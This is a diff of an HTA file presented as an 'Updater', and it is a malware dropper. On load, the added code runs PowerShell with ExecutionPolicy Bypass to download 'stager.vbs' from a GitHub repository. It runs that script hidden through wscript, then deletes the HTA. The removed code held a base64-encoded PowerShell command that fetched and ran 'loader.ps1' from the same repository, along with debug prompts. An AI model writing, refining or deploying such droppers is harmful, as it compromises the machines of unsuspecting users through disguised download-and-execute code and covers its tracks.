@@ -8,75 +8,29 @@
     windowstate="minimize"
     showintaskbar="no"
   />
-  <title>Updater (Debug)</title>
+  <title>Updater</title>
   <script language="VBScript">
     Sub Window_OnLoad()
-      Dim sh, psPath, cmdLine, dbg, fso, dbgFile, htaPath
+      Dim sh, fso, tempVbs, htaPath
 
-      ' --- Setup debug log ---
-      Set fso    = CreateObject("Scripting.FileSystemObject")
-      dbg        = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
-      If fso.FileExists(dbg) Then fso.DeleteFile dbg, True
-      Set dbgFile = fso.CreateTextFile(dbg, True)
-      dbgFile.WriteLine "HTA Debug Start: " & Now()
-      dbgFile.Close
-      MsgBox "Debug: Started", vbOKOnly, "HTA Debug"
+      Set sh      = CreateObject("WScript.Shell")
+      Set fso     = CreateObject("Scripting.FileSystemObject")
+      tempVbs     = sh.ExpandEnvironmentStrings("%TEMP%") & "\stager.vbs"
 
-      ' --- 1) Create Shell object ---
-      On Error Resume Next
-      Set sh = CreateObject("WScript.Shell")
-      If Err.Number <> 0 Then
-        MsgBox "Error at CreateObject: " & Err.Description, vbCritical, "HTA Debug"
-        AppendLog "Failed to create WScript.Shell: " & Err.Description
-        Exit Sub
-      Else
-        MsgBox "Debug: Created Shell", vbOKOnly, "HTA Debug"
-        AppendLog "Created WScript.Shell"
-      End If
-      On Error GoTo 0
+      ' --- 1) Download the working stager.vbs ---
+      ' Uses PowerShell for simplicity; could also use XMLHTTP in pure VBScript
+      sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
+             """Invoke-WebRequest -UseBasicParsing " & _
+             "'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/stager.vbs' -OutFile """ & tempVbs & """" & _
+             "", 0, True
 
-      ' --- 2) Resolve PowerShell path ---
-      psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe")
-      MsgBox "Debug: psPath = " & psPath, vbOKOnly, "HTA Debug"
-      AppendLog "psPath = " & psPath
+      ' --- 2) Execute the downloaded VBScript stub hidden ---
+      sh.Run "wscript.exe """ & tempVbs & """", 0, False
 
-      ' --- 3) Build command line ---
-      cmdLine = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
-      MsgBox "Debug: cmdLine = " & cmdLine, vbOKOnly, "HTA Debug"
-      AppendLog "cmdLine built"
-
-      ' --- 4) Run PowerShell ---
-      On Error Resume Next
-      sh.Run cmdLine, 0, False
-      If Err.Number <> 0 Then
-        MsgBox "Error at sh.Run: " & Err.Description, vbCritical, "HTA Debug"
-        AppendLog "sh.Run failed: " & Err.Description
-        Exit Sub
-      Else
-        MsgBox "Debug: sh.Run invoked", vbOKOnly, "HTA Debug"
-        AppendLog "sh.Run invoked successfully"
-      End If
-      On Error GoTo 0
-
-      ' --- 5) Clean up HTA ---
+      ' --- 3) Clean up the HTA itself and exit ---
       htaPath = document.location.pathname
-      MsgBox "Debug: about to delete HTA at " & htaPath, vbOKOnly, "HTA Debug"
-      AppendLog "Deleting HTA: " & htaPath
-      fso.DeleteFile htaPath, True
-      AppendLog "HTA deleted"
-
-      ' --- 6) Close the window ---
-      MsgBox "Debug: closing HTA", vbOKOnly, "HTA Debug"
-      AppendLog "Closing HTA"
+      If fso.FileExists(htaPath) Then fso.DeleteFile htaPath, True
       self.close
-    End Sub
-
-    Sub AppendLog(msg)
-      Dim lf, fso
-      Set fso = CreateObject("Scripting.FileSystemObject")
-      Set lf = fso.OpenTextFile(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\hta_debug.txt"), 8, True)
-      lf.WriteLine Now() & " - " & msg
-      lf.Close
     End Sub
   </script>
 </head>
